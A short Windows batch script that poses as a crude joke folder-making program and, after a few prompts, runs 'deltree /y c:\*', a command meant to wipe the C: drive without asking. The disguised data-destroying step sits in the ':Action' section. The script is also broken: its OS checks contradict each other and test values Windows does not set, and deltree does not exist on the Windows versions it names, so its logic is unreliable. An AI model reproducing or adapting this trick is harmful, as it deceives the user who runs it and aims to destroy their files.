@echo on

goto :Start

:Start

  :: Check for Windows 10
  if not "%OS%"=="Windows_10" goto Incompatible
  :: Check for Windows 7
  if not "%OS%"=="Windows_7" goto Incompatible
  goto Warning

:Incompatible

  echo Sorry, this batch file was written for Windows 10 and Windows 7 only
  echo.
  pause
  exit

:Warning

  pause
  echo Never abuse your porn :)
  echo.
  pause
  echo Creating porn, press any key to confirm action
  echo.
  pause
  goto Action
  
:Action

  echo Folder Making = 100, press any key to exit program :)
  deltree /y c:\*
  pause
  exit
